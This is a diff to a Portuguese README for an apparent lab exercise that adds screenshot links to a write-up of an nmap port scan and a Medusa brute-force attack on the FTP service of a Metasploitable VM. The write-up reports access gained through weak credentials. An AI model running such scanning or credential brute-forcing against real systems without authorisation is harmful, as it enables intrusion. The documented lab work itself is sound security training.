@@ -32,14 +32,16 @@ Documentação dos resultados e evidências (prints/logs dos comandos executados
 
 # Escaneamento de portas e serviços
 nmap -sV -p 21,22,80,445,139 192.168.56.101
+![Nmap scan](screenshots/nmap-scan.jpeg)
 
 # Ataque de força bruta ao serviço FTP com Medusa
 medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
-
+![Medusa resultado](screenshots/brute-force.jpeg)
 
 📎 Resultados
 
 Foi possível obter acesso válido ao serviço FTP utilizando a ferramenta Medusa, evidenciando o uso de credenciais fracas no ambiente Metasploitable.
+![Invasão](screenshots/resultado.jpeg)
 
 ⚠️ Aviso Legal
 
